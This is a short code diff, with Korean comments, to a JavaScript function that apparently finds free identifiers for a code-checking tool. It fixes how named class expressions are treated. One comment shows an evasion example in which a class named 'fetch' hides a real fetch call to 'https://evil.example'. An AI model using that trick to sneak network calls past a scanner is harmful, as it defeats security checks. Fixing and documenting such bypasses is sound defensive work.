@@ -327,7 +327,10 @@ function freeIdentifiers(code) {
        이름(`class Inner {}`)은 선언이고, 필드·메서드 키(`field = 1`, `method() {}`)는 참조가
        아니다. 둘 다 빼지 않으면 정상 코드를 «낯선 이름»으로 FAIL 해, 사람이 기준선을
        정당하게 갱신할 때 헛걸음을 만든다. */
-    if ((n.type === 'ClassDeclaration' || n.type === 'ClassExpression') && n.id) declared.add(n.id.name);
+    /* ⚠️ ClassExpression 의 내부 이름은 «그 클래스 안에서만» 보인다 — 전역 declared 에 넣으면
+       `const m = class fetch {}; fetch('https://evil.example')` 에서 바깥 fetch 가 선언된 것으로
+       오인된다 (260809 Codex R12 P2). 선언으로 세는 것은 ClassDeclaration 만. */
+    if (n.type === 'ClassDeclaration' && n.id) declared.add(n.id.name);
     if (n.type === 'Identifier') {
       /* «이름을 쓰는 자리»가 아닌 곳은 참조가 아니다 */
       const isMemberProp = parent && parent.type === 'MemberExpression' && key === 'property' && !parent.computed;
